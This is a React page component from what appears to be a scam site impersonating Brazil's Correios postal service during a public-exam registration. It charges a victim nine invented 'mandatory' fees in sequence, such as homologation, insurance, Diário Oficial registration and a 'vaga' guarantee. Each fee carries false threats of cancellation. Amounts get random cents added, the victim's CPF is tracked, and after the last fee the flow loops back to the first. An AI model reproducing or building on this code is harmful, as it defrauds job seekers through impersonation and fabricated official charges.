import { useEffect } from "react";
import { useNavigate, useLocation, useParams } from "react-router-dom";
import CorreiosHeader from "@/components/CorreiosHeader";
import CorreiosFooter from "@/components/CorreiosFooter";
import UpsellStep from "@/components/UpsellStep";
import { CPFData } from "@/lib/cpf";
import { getSession, saveSession } from "@/hooks/useSessionPersistence";
import { buildUrlWithUtm } from "@/hooks/useUtmTracking";
import { trackFunnelEvent } from "@/hooks/useFunnelTracking";

const UPSELLS = [
  { valor: 47, title: "Taxa de Homologação da Inscrição", description: "OBRIGATÓRIA para validar sua inscrição no sistema federal. Sem homologação, a inscrição será automaticamente cancelada." },
  { valor: 37, title: "Taxa de Processamento do Edital", description: "Sem esta taxa, sua inscrição fica com status PENDENTE no sistema e não será processada pela banca." },
  { valor: 39, title: "Seguro Obrigatório do Candidato", description: "Exigido pelo edital para garantir reembolso integral em caso de cancelamento ou adiamento do concurso." },
  { valor: 27, title: "Taxa de Alocação de Local de Prova", description: "Necessária para reservar seu local de prova. Candidatos sem alocação ficam em lista de espera." },
  { valor: 33, title: "Taxa de Emissão do Cartão de Confirmação", description: "Documento OBRIGATÓRIO para acesso ao local da prova. Sem o cartão, o candidato é impedido de realizar o exame." },
  { valor: 24, title: "Taxa de Autenticação Digital", description: "Autenticação ICP-Brasil exigida pelo edital para validação eletrônica da inscrição." },
  { valor: 19, title: "Taxa de Registro no Diário Oficial", description: "Publicação obrigatória conforme legislação vigente. Necessária para oficializar a inscrição." },
  { valor: 15, title: "Taxa de Protocolo Final", description: "Encerramento do protocolo de inscrição no sistema. Sem protocolo final, a inscrição não é concluída." },
  { valor: 97, title: "Garantia de Vaga na Região", description: "ÚLTIMA ETAPA — Garante sua vaga na agência mais próxima da sua residência com prioridade na alocação." },
];

const Upsell = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { step } = useParams<{ step: string }>();

  const parsedStep = parseInt(step || "1", 10);
  const stepNumber = isNaN(parsedStep) ? 1 : Math.min(Math.max(parsedStep, 1), 9);
  const currentIndex = stepNumber - 1;
  const currentUpsell = UPSELLS[currentIndex];

  const valorComCentavos = currentUpsell.valor + (Math.floor(Math.random() * 99) + 1) / 100;

  const session = getSession();
  const cpfData: CPFData | undefined = location.state?.cpfData || session?.cpfData;
  const valorBeneficio: number | undefined = location.state?.valorBeneficio || session?.valorBeneficio;
  const protocolo: string | undefined = location.state?.protocolo || session?.protocolo;

  useEffect(() => { window.scrollTo(0, 0); }, [stepNumber]);

  useEffect(() => {
    if (!cpfData) { navigate("/"); return; }
    saveSession({ cpfData, currentStep: `/upsell/${stepNumber}`, valorBeneficio, protocolo });
    trackFunnelEvent(`upsell-${stepNumber}`, { cpf: cpfData.cpf });
  }, [cpfData, valorBeneficio, protocolo, navigate, stepNumber]);

  const handlePaymentConfirmed = () => {
    const stateData = { cpfData, valorBeneficio, protocolo };
    if (stepNumber < 9) {
      navigate(buildUrlWithUtm(`/upsell-info/${stepNumber + 1}`), { state: stateData });
    } else {
      navigate(buildUrlWithUtm("/upsell-info/1"), { state: stateData });
    }
  };

  if (!cpfData) return null;

  return (
    <div className="min-h-screen flex flex-col bg-background">
      <CorreiosHeader breadcrumb="Concursos > Inscrição > Taxas" />

      <main className="flex-1 flex items-center justify-center px-4 py-6 sm:py-8">
        <UpsellStep
          key={stepNumber}
          title={currentUpsell.title}
          description={currentUpsell.description}
          valor={valorComCentavos}
          cpfData={cpfData}
          protocolo={protocolo || `COR${Date.now()}`}
          onPaymentConfirmed={handlePaymentConfirmed}
          stepNumber={stepNumber}
          totalSteps={9}
        />
      </main>

      <CorreiosFooter />
    </div>
  );
};

export default Upsell;
